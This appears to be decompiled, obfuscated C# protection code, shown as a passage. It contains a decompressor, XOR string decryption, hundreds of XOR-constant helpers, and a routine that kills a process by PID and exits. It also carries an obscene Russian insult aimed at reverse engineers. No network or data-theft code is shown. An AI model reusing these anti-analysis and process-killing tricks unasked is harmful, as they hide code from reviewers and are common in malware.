#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using LocalizationStringTools;

internal class EazfuscatorResourceDecoder
{
	public const int int_0 = default(int);

	public const int int_1 = default(int);

	public const int int_2 = default(int);

	public const int int_3 = default(int);

	private const uint uint_0 = default(uint);

	public static Dictionary<string, string> dictionary_0;

	public static string[] string_0;

	public static uint? nullable_0;

	public static Dictionary<string, string> dictionary_1;

	public static Assembly assembly_0;

	static void smethod_0()
	{
		smethod_11319();
		smethod_11318();
		smethod_11317();
		smethod_11316();
		smethod_11315();
		smethod_11314();
		smethod_11313();
		smethod_11312();
		smethod_11311();
		smethod_11310();
		smethod_11309();
		smethod_11308();
		smethod_11307();
		smethod_11306();
		smethod_11305();
		smethod_11304();
		smethod_11303();
		smethod_11302();
		smethod_11301();
		smethod_11300();
		smethod_11299();
		smethod_11298();
		smethod_11297();
		smethod_11296();
		smethod_11295();
		smethod_11294();
		smethod_11293();
		smethod_11292();
		smethod_11291();
		smethod_11290();
		smethod_11289();
		smethod_11287();
		smethod_11285();
		LocalizationStringTools.smethod_1("Хитролох_иди_нахуй._46__4_____32_____");
	}

	[Obsolete("Exclude")]
	public static int smethod_1(byte[] byte_0)
	{
		return ((byte_0[0] & 2) != 2) ? 3 : 9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2(byte[] byte_0)
	{
		if (smethod_1(byte_0) != 9)
		{
			return byte_0[2];
		}
		return byte_0[5] | (byte_0[6] << 8) | (byte_0[7] << 16) | (byte_0[8] << 24);
	}

	[Obsolete("Exclude")]
	public static byte[] smethod_3(byte[] byte_0)
	{
		int num = smethod_2(byte_0);
		int num2 = smethod_1(byte_0);
		int num3 = 0;
		uint num4 = 1u;
		byte[] array = new byte[num];
		int[] array2 = new int[4096];
		byte[] array3 = new byte[4096];
		int num5 = num - 6 - 4 - 1;
		int num6 = -1;
		uint num7 = 0u;
		int num8 = (byte_0[0] >> 2) & 3;
		if (num8 == 1 || num8 == 3)
		{
			if ((byte_0[0] & 1) == 1)
			{
				while (true)
				{
					if (num4 == 1)
					{
						num4 = (uint)(byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16) | (byte_0[num2 + 3] << 24));
						num2 += 4;
						if (num3 <= num5)
						{
							num7 = (uint)((num8 == 1) ? (byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16)) : (byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16) | (byte_0[num2 + 3] << 24)));
						}
					}
					if ((num4 & 1) != 1)
					{
						if (num3 > num5)
						{
							break;
						}
						array[num3] = byte_0[num2];
						num3++;
						num2++;
						num4 >>= 1;
						if (num8 != 1)
						{
							num7 = (uint)(((num7 >> 8) & 0xFFFF) | (byte_0[num2 + 2] << 16) | (byte_0[num2 + 3] << 24));
							continue;
						}
						while (num6 < num3 - 3)
						{
							num6++;
							int num9 = array[num6] | (array[num6 + 1] << 8) | (array[num6 + 2] << 16);
							int num10 = ((num9 >> 12) ^ num9) & 0xFFF;
							array2[num10] = num6;
							array3[num10] = 1;
						}
						num7 = (uint)(((num7 >> 8) & 0xFFFF) | (byte_0[num2 + 2] << 16));
						continue;
					}
					num4 >>= 1;
					uint num12;
					uint num13;
					if (num8 != 1)
					{
						uint num11;
						if ((num7 & 3) != 0)
						{
							if ((num7 & 2) != 0)
							{
								if ((num7 & 1) != 0)
								{
									if ((num7 & 0x7F) == 3)
									{
										num11 = num7 >> 15;
										num12 = ((num7 >> 7) & 0xFF) + 3;
										num2 += 4;
									}
									else
									{
										num11 = (num7 >> 7) & 0x1FFFF;
										num12 = ((num7 >> 2) & 0x1F) + 2;
										num2 += 3;
									}
								}
								else
								{
									num11 = (num7 & 0xFFFF) >> 6;
									num12 = ((num7 >> 2) & 0xF) + 3;
									num2 += 2;
								}
							}
							else
							{
								num11 = (num7 & 0xFFFF) >> 2;
								num12 = 3u;
								num2 += 2;
							}
						}
						else
						{
							num11 = (num7 & 0xFF) >> 2;
							num12 = 3u;
							num2++;
						}
						num13 = (uint)(num3 - num11);
					}
					else
					{
						int num10 = ((int)num7 >> 4) & 0xFFF;
						num13 = (uint)array2[num10];
						if ((num7 & 0xF) == 0)
						{
							num12 = byte_0[num2 + 2];
							num2 += 3;
						}
						else
						{
							num12 = (num7 & 0xF) + 2;
							num2 += 2;
						}
					}
					array[num3] = array[num13];
					array[num3 + 1] = array[num13 + 1];
					array[num3 + 2] = array[num13 + 2];
					for (int i = 3; i < num12; i++)
					{
						array[num3 + i] = array[num13 + i];
					}
					num3 += (int)num12;
					if (num8 != 1)
					{
						num7 = (uint)(byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16) | (byte_0[num2 + 3] << 24));
					}
					else
					{
						num7 = (uint)(array[num6 + 1] | (array[num6 + 2] << 8) | (array[num6 + 3] << 16));
						while (num6 < num3 - num12)
						{
							num6++;
							int num10 = (int)(((num7 >> 12) ^ num7) & 0xFFF);
							array2[num10] = num6;
							array3[num10] = 1;
							num7 = (uint)(((num7 >> 8) & 0xFFFF) | (array[num6 + 3] << 16));
						}
						num7 = (uint)(byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16));
					}
					num6 = num3 - 1;
				}
				while (num3 <= num - 1)
				{
					if (num4 == 1)
					{
						num2 += 4;
						num4 = 2147483648u;
					}
					array[num3] = byte_0[num2];
					num3++;
					num2++;
					num4 >>= 1;
				}
				return array;
			}
			byte[] array4 = new byte[num];
			Array.Copy(byte_0, smethod_1(byte_0), array4, 0, num);
			return array4;
		}
		throw new ArgumentException("C# version only supports level 1 and 3");
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	[Obsolete("Exclude")]
	private static extern nint OpenProcess(uint uint_1, bool bool_0, uint uint_2);

	[DllImport("kernel32.dll", SetLastError = true)]
	[Obsolete("Exclude")]
	private static extern bool TerminateProcess(nint intptr_0, uint uint_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	[Obsolete("Exclude")]
	private static extern bool CloseHandle(nint intptr_0);

	[Obsolete("Exclude")]
	public static void smethod_4(uint uint_1)
	{
		try
		{
			nint num = OpenProcess(1u, bool_0: false, uint_1);
			if (!(num == IntPtr.Zero))
			{
				try
				{
					if (!TerminateProcess(num, 0u))
					{
						throw new Win32Exception(Marshal.GetLastWin32Error(), $"Failed to terminate process with PID {uint_1}.");
					}
					Environment.Exit(-1);
					return;
				}
				finally
				{
					CloseHandle(num);
				}
			}
			throw new Win32Exception(Marshal.GetLastWin32Error(), $"Failed to open process with PID {uint_1}.");
		}
		catch
		{
			Process.GetProcessById((int)uint_1).Kill();
		}
	}

	[Obsolete("Exclude")]
	public static string smethod_5(string string_1, int int_4)
	{
		try
		{
			if (dictionary_0 == null)
			{
				dictionary_0 = new Dictionary<string, string>();
			}
			lock (dictionary_0)
			{
				if (!dictionary_0.TryGetValue(string_1, out var value))
				{
					char[] array = string_1.ToCharArray();
					for (int i = 0; i < array.Length; i++)
					{
						array[i] = (char)(array[i] ^ int_4);
					}
					string value2 = new string(array);
					dictionary_0[string_1] = value2;
					return dictionary_0[string_1];
				}
				return value;
			}
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	[Obsolete("Exclude")]
	public static int smethod_6(int int_4, int int_5)
	{
		try
		{
			return int_4 ^ int_5;
		}
		catch (Exception)
		{
			return 0;
		}
	}

	[Obsolete("Exclude")]
	public static int smethod_7(int int_4)
	{
		return int_4 ^ 0x7A1835F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8(int int_4)
	{
		return int_4 ^ 0x78635800;
	}

	[Obsolete("Exclude")]
	public static int smethod_9(int int_4)
	{
		return int_4 ^ 0x3C152905;
	}

	[Obsolete("Exclude")]
	public static int smethod_10(int int_4)
	{
		return int_4 ^ 0x1A4C5AFD;
	}

	[Obsolete("Exclude")]
	public static int smethod_11(int int_4)
	{
		return int_4 ^ 0x52CE0827;
	}

	[Obsolete("Exclude")]
	public static int smethod_12(int int_4)
	{
		return int_4 ^ 0x76821B7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_13(int int_4)
	{
		return int_4 ^ 0x29A1CFC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_14(int int_4)
	{
		return int_4 ^ 0x6A894EB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_15(int int_4)
	{
		return int_4 ^ 0x4E8F129;
	}

	[Obsolete("Exclude")]
	public static int smethod_16(int int_4)
	{
		return int_4 ^ 0x3278841A;
	}

	[Obsolete("Exclude")]
	public static int smethod_17(int int_4)
	{
		return int_4 ^ 0x73A8ED12;
	}

	[Obsolete("Exclude")]
	public static int smethod_18(int int_4)
	{
		return int_4 ^ 0x6818F4E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_19(int int_4)
	{
		return int_4 ^ 0x710357CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_20(int int_4)
	{
		return int_4 ^ 0x6DEBE3AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_21(int int_4)
	{
		return int_4 ^ 0x29C98B15;
	}

	[Obsolete("Exclude")]
	public static int smethod_22(int int_4)
	{
		return int_4 ^ 0x588D5E30;
	}

	[Obsolete("Exclude")]
	public static int smethod_23(int int_4)
	{
		return int_4 ^ 0x5772A769;
	}

	[Obsolete("Exclude")]
	public static int smethod_24(int int_4)
	{
		return int_4 ^ 0x6E2F0037;
	}

	[Obsolete("Exclude")]
	public static int smethod_25(int int_4)
	{
		return int_4 ^ 0x29DE5892;
	}

	[Obsolete("Exclude")]
	public static int smethod_26(int int_4)
	{
		return int_4 ^ 0x3D0F73F;
	}

	[Obsolete("Exclude")]
	public static int smethod_27(int int_4)
	{
		return int_4 ^ 0x2C5BABE;
	}

	[Obsolete("Exclude")]
	public static int smethod_28(int int_4)
	{
		return int_4 ^ 0x6EAF337C;
	}

	[Obsolete("Exclude")]
	public static int smethod_29(int int_4)
	{
		return int_4 ^ 0x7219F24A;
	}

	[Obsolete("Exclude")]
	public static int smethod_30(int int_4)
	{
		return int_4 ^ 0x238184F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_31(int int_4)
	{
		return int_4 ^ 0x1B7905A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_32(int int_4)
	{
		return int_4 ^ 0x75EEC999;
	}

	[Obsolete("Exclude")]
	public static int smethod_33(int int_4)
	{
		return int_4 ^ 0x418611D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_34(int int_4)
	{
		return int_4 ^ 0x23CF140C;
	}

	[Obsolete("Exclude")]
	public static int smethod_35(int int_4)
	{
		return int_4 ^ 0x1C96933D;
	}

	[Obsolete("Exclude")]
	public static int smethod_36(int int_4)
	{
		return int_4 ^ 0x7ED0321B;
	}

	[Obsolete("Exclude")]
	public static int smethod_37(int int_4)
	{
		return int_4 ^ 0x6F555B63;
	}

	[Obsolete("Exclude")]
	public static int smethod_38(int int_4)
	{
		return int_4 ^ 0x2864C768;
	}

	[Obsolete("Exclude")]
	public static int smethod_39(int int_4)
	{
		return int_4 ^ 0x2C94891C;
	}

	[Obsolete("Exclude")]
	public static int smethod_40(int int_4)
	{
		return int_4 ^ 0x594750C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_41(int int_4)
	{
		return int_4 ^ 0x64A55015;
	}

	[Obsolete("Exclude")]
	public static int smethod_42(int int_4)
	{
		return int_4 ^ 0x4D7EA05C;
	}

	[Obsolete("Exclude")]
	public static int smethod_43(int int_4)
	{
		return int_4 ^ 0xFD330B;
	}

	[Obsolete("Exclude")]
	public static int smethod_44(int int_4)
	{
		return int_4 ^ 0x3DA14558;
	}

	[Obsolete("Exclude")]
	public static int smethod_45(int int_4)
	{
		return int_4 ^ 0x7AB12C94;
	}

	[Obsolete("Exclude")]
	public static int smethod_46(int int_4)
	{
		return int_4 ^ 0xF48C0AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_47(int int_4)
	{
		return int_4 ^ 0x3E5773D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_48(int int_4)
	{
		return int_4 ^ 0x796E6FD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_49(int int_4)
	{
		return int_4 ^ 0x2A8D36B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_50(int int_4)
	{
		return int_4 ^ 0x52AF7BEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_51(int int_4)
	{
		return int_4 ^ 0x451913D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_52(int int_4)
	{
		return int_4 ^ 0x7D6CDDD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_53(int int_4)
	{
		return int_4 ^ 0x2E2A9111;
	}

	[Obsolete("Exclude")]
	public static int smethod_54(int int_4)
	{
		return int_4 ^ 0x558145EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_55(int int_4)
	{
		return int_4 ^ 0x345AD4C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_56(int int_4)
	{
		return int_4 ^ 0x6844BD8E;
	}

	[Obsolete("Exclude")]
	public static int smethod_57(int int_4)
	{
		return int_4 ^ 0x3284B558;
	}

	[Obsolete("Exclude")]
	public static int smethod_58(int int_4)
	{
		return int_4 ^ 0x6051D688;
	}

	[Obsolete("Exclude")]
	public static int smethod_59(int int_4)
	{
		return int_4 ^ 0x172BC8CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_60(int int_4)
	{
		return int_4 ^ 0x737D2D8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_61(int int_4)
	{
		return int_4 ^ 0x64300BC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_62(int int_4)
	{
		return int_4 ^ 0x7D9696C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_63(int int_4)
	{
		return int_4 ^ 0x2C1C2703;
	}

	[Obsolete("Exclude")]
	public static int smethod_64(int int_4)
	{
		return int_4 ^ 0x1E0D021D;
	}

	[Obsolete("Exclude")]
	public static int smethod_65(int int_4)
	{
		return int_4 ^ 0xEAEF5F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_66(int int_4)
	{
		return int_4 ^ 0x394668B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_67(int int_4)
	{
		return int_4 ^ 0x3C4734B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_68(int int_4)
	{
		return int_4 ^ 0x259F5098;
	}

	[Obsolete("Exclude")]
	public static int smethod_69(int int_4)
	{
		return int_4 ^ 0x7C57BC1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_70(int int_4)
	{
		return int_4 ^ 0x5FBC3E87;
	}

	[Obsolete("Exclude")]
	public static int smethod_71(int int_4)
	{
		return int_4 ^ 0x5E2986A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_72(int int_4)
	{
		return int_4 ^ 0x1E0DBA8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_73(int int_4)
	{
		return int_4 ^ 0x34C3060;
	}

	[Obsolete("Exclude")]
	public static int smethod_74(int int_4)
	{
		return int_4 ^ 0xD7D6F96;
	}

	[Obsolete("Exclude")]
	public static int smethod_75(int int_4)
	{
		return int_4 ^ 0x764E6252;
	}

	[Obsolete("Exclude")]
	public static int smethod_76(int int_4)
	{
		return int_4 ^ 0x5364C39C;
	}

	[Obsolete("Exclude")]
	public static int smethod_77(int int_4)
	{
		return int_4 ^ 0x502CECB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_78(int int_4)
	{
		return int_4 ^ 0x177E6497;
	}

	[Obsolete("Exclude")]
	public static int smethod_79(int int_4)
	{
		return int_4 ^ 0x38238768;
	}

	[Obsolete("Exclude")]
	public static int smethod_80(int int_4)
	{
		return int_4 ^ 0x7F0C5819;
	}

	[Obsolete("Exclude")]
	public static int smethod_81(int int_4)
	{
		return int_4 ^ 0x5B2FF612;
	}

	[Obsolete("Exclude")]
	public static int smethod_82(int int_4)
	{
		return int_4 ^ 0x5A1C6523;
	}

	[Obsolete("Exclude")]
	public static int smethod_83(int int_4)
	{
		return int_4 ^ 0x39948370;
	}

	[Obsolete("Exclude")]
	public static int smethod_84(int int_4)
	{
		return int_4 ^ 0x650E6138;
	}

	[Obsolete("Exclude")]
	public static int smethod_85(int int_4)
	{
		return int_4 ^ 0x7E0987C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_86(int int_4)
	{
		return int_4 ^ 0x23E12426;
	}

	[Obsolete("Exclude")]
	public static int smethod_87(int int_4)
	{
		return int_4 ^ 0x35CCB700;
	}

	[Obsolete("Exclude")]
	public static int smethod_88(int int_4)
	{
		return int_4 ^ 0x4FFF8B3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_89(int int_4)
	{
		return int_4 ^ 0xAEB8125;
	}

	[Obsolete("Exclude")]
	public static int smethod_90(int int_4)
	{
		return int_4 ^ 0xC43FEF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_91(int int_4)
	{
		return int_4 ^ 0x6066C887;
	}

	[Obsolete("Exclude")]
	public static int smethod_92(int int_4)
	{
		return int_4 ^ 0x737DC93D;
	}

	[Obsolete("Exclude")]
	public static int smethod_93(int int_4)
	{
		return int_4 ^ 0x6009E2F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_94(int int_4)
	{
		return int_4 ^ 0x5C4E7569;
	}

	[Obsolete("Exclude")]
	public static int smethod_95(int int_4)
	{
		return int_4 ^ 0x506353A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_96(int int_4)
	{
		return int_4 ^ 0x5050259C;
	}

	[Obsolete("Exclude")]
	public static int smethod_97(int int_4)
	{
		return int_4 ^ 0x1BFC86D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_98(int int_4)
	{
		return int_4 ^ 0x5AE43385;
	}

	[Obsolete("Exclude")]
	public static int smethod_99(int int_4)
	{
		return int_4 ^ 0x5ABC571;
	}

	[Obsolete("Exclude")]
	public static int smethod_100(int int_4)
	{
		return int_4 ^ 0x77D8B132;
	}

	[Obsolete("Exclude")]
	public static int smethod_101(int int_4)
	{
		return int_4 ^ 0x41F2BF89;
	}

	[Obsolete("Exclude")]
	public static int smethod_102(int int_4)
	{
		return int_4 ^ 0x3EB19CB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_103(int int_4)
	{
		return int_4 ^ 0x50D3DC65;
	}

	[Obsolete("Exclude")]
	public static int smethod_104(int int_4)
	{
		return int_4 ^ 0xA79FEE9;
	}

	[Obsolete("Exclude")]
	public static int smethod_105(int int_4)
	{
		return int_4 ^ 0x7F5E841B;
	}

	[Obsolete("Exclude")]
	public static int smethod_106(int int_4)
	{
		return int_4 ^ 0x3C5D04EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_107(int int_4)
	{
		return int_4 ^ 0x7F0BC07A;
	}

	[Obsolete("Exclude")]
	public static int smethod_108(int int_4)
	{
		return int_4 ^ 0x249D69A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_109(int int_4)
	{
		return int_4 ^ 0x3B0C30F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_110(int int_4)
	{
		return int_4 ^ 0x1D0A62E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_111(int int_4)
	{
		return int_4 ^ 0x4FFDEC2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_112(int int_4)
	{
		return int_4 ^ 0x6C10D2B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_113(int int_4)
	{
		return int_4 ^ 0x5D0CFCC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_114(int int_4)
	{
		return int_4 ^ 0x703ED01B;
	}

	[Obsolete("Exclude")]
	public static int smethod_115(int int_4)
	{
		return int_4 ^ 0x72F729CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_116(int int_4)
	{
		return int_4 ^ 0x4A1876C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_117(int int_4)
	{
		return int_4 ^ 0xAEC3AC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_118(int int_4)
	{
		return int_4 ^ 0x6A2CBEC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_119(int int_4)
	{
		return int_4 ^ 0x38D72596;
	}

	[Obsolete("Exclude")]
	public static int smethod_120(int int_4)
	{
		return int_4 ^ 0x2FF7961E;
	}

	[Obsolete("Exclude")]
	public static int smethod_121(int int_4)
	{
		return int_4 ^ 0x5C076880;
	}

	[Obsolete("Exclude")]
	public static int smethod_122(int int_4)
	{
		return int_4 ^ 0x48759178;
	}

	[Obsolete("Exclude")]
	public static int smethod_123(int int_4)
	{
		return int_4 ^ 0x71A56EDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_124(int int_4)
	{
		return int_4 ^ 0x10EC35C;
	}

	[Obsolete("Exclude")]
	public static int smethod_125(int int_4)
	{
		return int_4 ^ 0x28C8312F;
	}

	[Obsolete("Exclude")]
	public static int smethod_126(int int_4)
	{
		return int_4 ^ 0x65FDC28B;
	}

	[Obsolete("Exclude")]
	public static int smethod_127(int int_4)
	{
		return int_4 ^ 0x130CFCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_128(int int_4)
	{
		return int_4 ^ 0x4A1EDDA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_129(int int_4)
	{
		return int_4 ^ 0x48B1D174;
	}

	[Obsolete("Exclude")]
	public static int smethod_130(int int_4)
	{
		return int_4 ^ 0x38320AFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_131(int int_4)
	{
		return int_4 ^ 0x6404193E;
	}

	[Obsolete("Exclude")]
	public static int smethod_132(int int_4)
	{
		return int_4 ^ 0x77C03EAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_133(int int_4)
	{
		return int_4 ^ 0x2B2B54E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_134(int int_4)
	{
		return int_4 ^ 0x7B2E6C6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_135(int int_4)
	{
		return int_4 ^ 0x6809EFC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_136(int int_4)
	{
		return int_4 ^ 0x61F80B5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_137(int int_4)
	{
		return int_4 ^ 0xAF783C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_138(int int_4)
	{
		return int_4 ^ 0x71F02290;
	}

	[Obsolete("Exclude")]
	public static int smethod_139(int int_4)
	{
		return int_4 ^ 0x2E047E49;
	}

	[Obsolete("Exclude")]
	public static int smethod_140(int int_4)
	{
		return int_4 ^ 0x12239D1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_141(int int_4)
	{
		return int_4 ^ 0x453CA122;
	}

	[Obsolete("Exclude")]
	public static int smethod_142(int int_4)
	{
		return int_4 ^ 0x2E1FB908;
	}

	[Obsolete("Exclude")]
	public static int smethod_143(int int_4)
	{
		return int_4 ^ 0x638D4D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_144(int int_4)
	{
		return int_4 ^ 0x1509D7A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_145(int int_4)
	{
		return int_4 ^ 0x6344CD39;
	}

	[Obsolete("Exclude")]
	public static int smethod_146(int int_4)
	{
		return int_4 ^ 0x40AD7442;
	}

	[Obsolete("Exclude")]
	public static int smethod_147(int int_4)
	{
		return int_4 ^ 0x65C1EBE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_148(int int_4)
	{
		return int_4 ^ 0x58B8C6B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_149(int int_4)
	{
		return int_4 ^ 0x3E1DABEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_150(int int_4)
	{
		return int_4 ^ 0x78E6C476;
	}

	[Obsolete("Exclude")]
	public static int smethod_151(int int_4)
	{
		return int_4 ^ 0x7C6B7060;
	}

	[Obsolete("Exclude")]
	public static int smethod_152(int int_4)
	{
		return int_4 ^ 0x29AEB8F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_153(int int_4)
	{
		return int_4 ^ 0x1D0A4ED9;
	}

	[Obsolete("Exclude")]
	public static int smethod_154(int int_4)
	{
		return int_4 ^ 0x71B042B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_155(int int_4)
	{
		return int_4 ^ 0x5C8B5CC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_156(int int_4)
	{
		return int_4 ^ 0x63F4B8AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_157(int int_4)
	{
		return int_4 ^ 0x5012600;
	}

	[Obsolete("Exclude")]
	public static int smethod_158(int int_4)
	{
		return int_4 ^ 0xB1859C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_159(int int_4)
	{
		return int_4 ^ 0x29AE8939;
	}

	[Obsolete("Exclude")]
	public static int smethod_160(int int_4)
	{
		return int_4 ^ 0x151FAB92;
	}

	[Obsolete("Exclude")]
	public static int smethod_161(int int_4)
	{
		return int_4 ^ 0x3898C35E;
	}

	[Obsolete("Exclude")]
	public static int smethod_162(int int_4)
	{
		return int_4 ^ 0x724C8CBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_163(int int_4)
	{
		return int_4 ^ 0x3E1D00E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_164(int int_4)
	{
		return int_4 ^ 0x61A339CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_165(int int_4)
	{
		return int_4 ^ 0x5A65451;
	}

	[Obsolete("Exclude")]
	public static int smethod_166(int int_4)
	{
		return int_4 ^ 0x1A7107C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_167(int int_4)
	{
		return int_4 ^ 0x22E31A45;
	}

	[Obsolete("Exclude")]
	public static int smethod_168(int int_4)
	{
		return int_4 ^ 0x25A82326;
	}

	[Obsolete("Exclude")]
	public static int smethod_169(int int_4)
	{
		return int_4 ^ 0x6403868F;
	}

	[Obsolete("Exclude")]
	public static int smethod_170(int int_4)
	{
		return int_4 ^ 0x29182DCB;
	}

	[Obsolete("Exclude")]
	public static int smethod_171(int int_4)
	{
		return int_4 ^ 0x2F25C420;
	}

	[Obsolete("Exclude")]
	public static int smethod_172(int int_4)
	{
		return int_4 ^ 0x1D9EAFB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_173(int int_4)
	{
		return int_4 ^ 0x34C3D593;
	}

	[Obsolete("Exclude")]
	public static int smethod_174(int int_4)
	{
		return int_4 ^ 0x1756D6E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_175(int int_4)
	{
		return int_4 ^ 0x7FB9D8DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_176(int int_4)
	{
		return int_4 ^ 0x11B059D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_177(int int_4)
	{
		return int_4 ^ 0x42C83153;
	}

	[Obsolete("Exclude")]
	public static int smethod_178(int int_4)
	{
		return int_4 ^ 0x39B0C8F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_179(int int_4)
	{
		return int_4 ^ 0x40E93CDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_180(int int_4)
	{
		return int_4 ^ 0x767C147F;
	}

	[Obsolete("Exclude")]
	public static int smethod_181(int int_4)
	{
		return int_4 ^ 0x353E2D68;
	}

	[Obsolete("Exclude")]
	public static int smethod_182(int int_4)
	{
		return int_4 ^ 0x695F270F;
	}

	[Obsolete("Exclude")]
	public static int smethod_183(int int_4)
	{
		return int_4 ^ 0x6842E095;
	}

	[Obsolete("Exclude")]
	public static int smethod_184(int int_4)
	{
		return int_4 ^ 0x688989D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_185(int int_4)
	{
		return int_4 ^ 0x405BCEFC;
	}

	[Obsolete("Exclude")]
	public static int smethod_186(int int_4)
	{
		return int_4 ^ 0x7B74EA29;
	}

	[Obsolete("Exclude")]
	public static int smethod_187(int int_4)
	{
		return int_4 ^ 0x155A65AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_188(int int_4)
	{
		return int_4 ^ 0x2A585591;
	}

	[Obsolete("Exclude")]
	public static int smethod_189(int int_4)
	{
		return int_4 ^ 0x4DA6DD4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_190(int int_4)
	{
		return int_4 ^ 0x79EC459F;
	}

	[Obsolete("Exclude")]
	public static int smethod_191(int int_4)
	{
		return int_4 ^ 0x3D27C208;
	}

	[Obsolete("Exclude")]
	public static int smethod_192(int int_4)
	{
		return int_4 ^ 0x1711C47A;
	}

	[Obsolete("Exclude")]
	public static int smethod_193(int int_4)
	{
		return int_4 ^ 0x60EB081F;
	}

	[Obsolete("Exclude")]
	public static int smethod_194(int int_4)
	{
		return int_4 ^ 0x6C5C808A;
	}

	[Obsolete("Exclude")]
	public static int smethod_195(int int_4)
	{
		return int_4 ^ 0x1C0E8D25;
	}

	[Obsolete("Exclude")]
	public static int smethod_196(int int_4)
	{
		return int_4 ^ 0x43989483;
	}

	[Obsolete("Exclude")]
	public static int smethod_197(int int_4)
	{
		return int_4 ^ 0xFDAC6A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_198(int int_4)
	{
		return int_4 ^ 0x4BBD662B;
	}

	[Obsolete("Exclude")]
	public static int smethod_199(int int_4)
	{
		return int_4 ^ 0x3ED75F1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_200(int int_4)
	{
		return int_4 ^ 0x6B308B37;
	}

	[Obsolete("Exclude")]
	public static int smethod_201(int int_4)
	{
		return int_4 ^ 0x3A34B1EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_202(int int_4)
	{
		return int_4 ^ 0x5A8F037C;
	}

	[Obsolete("Exclude")]
	public static int smethod_203(int int_4)
	{
		return int_4 ^ 0x36B98845;
	}

